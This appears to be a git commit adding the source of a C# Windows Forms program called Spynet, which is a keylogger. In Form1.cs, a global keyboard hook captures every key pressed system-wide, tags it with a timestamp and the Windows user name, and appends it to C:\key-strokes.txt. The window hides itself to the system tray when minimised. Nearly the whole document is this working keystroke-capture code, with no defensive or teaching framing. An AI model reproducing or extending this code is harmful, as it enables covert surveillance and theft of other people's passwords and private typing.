8173e2bf5b122c3f6eaa63b93a3d42f6d996cfa8
tbenfitz <tbenfitz@gmail.com>
2016-07-11 14:03:21 -0500

    Initial Commit

---
+++ Spynet/Form1.Designer.cs
@@ -0,0 +1,75 @@
+﻿namespace Spynet
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.lstLog = new System.Windows.Forms.ListBox();
+            this.notifyIcon_Spynet = new System.Windows.Forms.NotifyIcon(this.components);
+            this.SuspendLayout();
+            // 
+            // lstLog
+            // 
+            this.lstLog.FormattingEnabled = true;
+            this.lstLog.ItemHeight = 16;
+            this.lstLog.Location = new System.Drawing.Point(12, 12);
+            this.lstLog.Name = "lstLog";
+            this.lstLog.Size = new System.Drawing.Size(459, 452);
+            this.lstLog.TabIndex = 1;
+            // 
+            // notifyIcon_Spynet
+            // 
+            this.notifyIcon_Spynet.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon_Spynet.Icon")));
+            this.notifyIcon_Spynet.Text = "notifyIcon_Spynet";
+            this.notifyIcon_Spynet.Visible = true;
+            this.notifyIcon_Spynet.Click += new System.EventHandler(this.notifyIcon_Spynet_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(483, 478);
+            this.Controls.Add(this.lstLog);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "Spynet";
+            this.Resize += new System.EventHandler(this.Form1_Resize);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.ListBox lstLog;
+        private System.Windows.Forms.NotifyIcon notifyIcon_Spynet;
+
+    }
+}
+
---
+++ Spynet/Form1.cs
@@ -0,0 +1,111 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.ComponentModel.DataAnnotations;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Windows.Input;
+using Utilities;
+
+namespace Spynet
+{
+    public partial class Form1 : Form
+    {
+        private GlobalKeyboardHook gkh = new GlobalKeyboardHook();       
+
+        public Form1()
+        {
+            InitializeComponent();
+            InitializeKeys();
+        }
+
+        private void InitializeKeys()
+        {            
+            ///
+            /// Add keys to log
+            /// 
+            foreach (Keys key in Enum.GetValues(typeof(Keys)))
+            {
+                gkh.HookedKeys.Add(key);
+            }
+
+            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);            
+        }        
+
+        private void gkh_KeyDown(object sender, KeyEventArgs e)
+        {
+            try
+            {
+                KeyValuePair<string, string> userStrokes =
+                    new KeyValuePair<string, string>(Environment.UserName, e.KeyCode.ToString());
+
+                StringBuilder toWrite = new StringBuilder();
+
+                toWrite.Append(System.DateTime.Now.ToString("MM-dd-yyyy : hh.mm.ss - "));
+                toWrite.Append(userStrokes.Key);
+                toWrite.Append(" - ");
+
+                if (IsKeyLocked(Keys.CapsLock))
+                {
+                    if (e.KeyCode == Keys.CapsLock)
+                    {
+                        toWrite.Append("CAPS OFF");
+                    }
+                    else
+                    {
+                        toWrite.Append(e.KeyCode.ToString());
+                    }
+                }
+                else
+                {
+                    if (e.KeyCode == Keys.CapsLock)
+                    {
+                        toWrite.Append("CAPS ON");
+                    }
+                    else
+                    {
+                        toWrite.Append(e.KeyCode.ToString().ToLower());
+                    }
+                }        
+              
+                toWrite.Append("\r\n");
+
+                lstLog.Items.Add(toWrite);
+                
+                File.AppendAllText(@"C:\key-strokes.txt", toWrite.ToString(), Encoding.UTF8);
+
+                this.ScrollToBottom();
+            }
+            catch (Exception ex)
+            {
+                lstLog.Items.Add(ex.Message);
+            }
+        }
+
+        private void Form1_Resize(object sender, System.EventArgs e)
+        {
+            if (WindowState == FormWindowState.Minimized)
+            {
+                this.Hide();
+            }
+        }
+
+        private void ScrollToBottom()
+        {
+            int visibleItems = lstLog.ClientSize.Height / lstLog.ItemHeight;
+            lstLog.TopIndex = Math.Max(lstLog.Items.Count - visibleItems + 1, 0);
+        }
+
+        private void notifyIcon_Spynet_Click(object sender, EventArgs e)
+        {
+            this.Show();
+            this.WindowState = FormWindowState.Normal;
+        }
+    }
+}
